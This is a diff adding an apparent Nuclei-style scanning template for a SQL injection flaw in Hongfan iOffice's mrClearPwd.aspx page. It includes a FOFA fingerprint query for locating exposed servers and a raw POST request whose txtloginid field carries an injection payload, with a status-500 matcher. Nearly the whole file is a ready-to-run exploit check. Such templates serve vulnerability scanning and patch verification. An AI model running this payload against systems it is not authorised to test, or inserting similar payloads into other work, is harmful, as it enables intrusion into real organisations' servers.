@@ -1,0 +1,26 @@
+id: poc-og63h3wk72nyy65h
+info:
+  name: 红帆ioffice mrClearPwd.aspx 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/og63h3wk72nyy65h'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: og63h3wk72nyy65h
+    fofa: (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")
+http:
+- raw:
+  - 'POST /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=YOUR__VIEWSTATE&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&txtloginid=''-1/user--+-&grop1=rad2&txtmobileNO=1&txtmobile=13888888888&ok=%E7%A1%AE%E3%80%80%E8%AE%A4'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
